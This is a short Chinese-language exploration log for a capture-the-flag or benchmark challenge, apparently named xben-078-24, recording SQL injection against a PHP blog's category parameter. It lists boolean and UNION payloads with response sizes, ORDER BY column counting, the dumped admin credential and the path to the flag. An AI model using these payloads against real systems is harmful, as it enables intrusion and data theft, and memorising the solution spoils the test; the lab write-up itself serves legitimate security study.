# xben-078-24 · 探索记录

对应题解：[`xben-078-24.md`](./xben-078-24.md)

## 目标与起点

`10.0.172.219:80`，PHP 7.4.33 博客，`/?category=Nature`。

## 第一阶段：定性

| payload | size |
| --- | --- |
| `Nature' AND 1=1-- -` | 2658 |
| `Nature' AND 1=2-- -` | 1402 |
| `Nature' UNION SELECT 1,2,3,4,5-- -` | 1398（列数不对） |

## 第二阶段：列数

`ORDER BY 7` 正常、`ORDER BY 8` 报错 → 7 列；UNION 第 2 列显示为标题。

## 第三阶段：拖库

- `blogDB`，表 `admins,comments,posts`
- `admins: admin:ONEverySecurePassword123!`
- 隐藏文章 `id=12` 标题 `SECRET POST`

用管理员口令登录 `/admin.php` → flag。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 猜 `/admin/`、`/login.php` | 404 | 入口是 `/admin.php` |
| 盲读 `/flag` | 404 | flag 不在根路径 |

## 这次真正的收获

布尔差值是判断注入最快的方式；`ORDER BY` 二分列数比逐个 UNION 快。
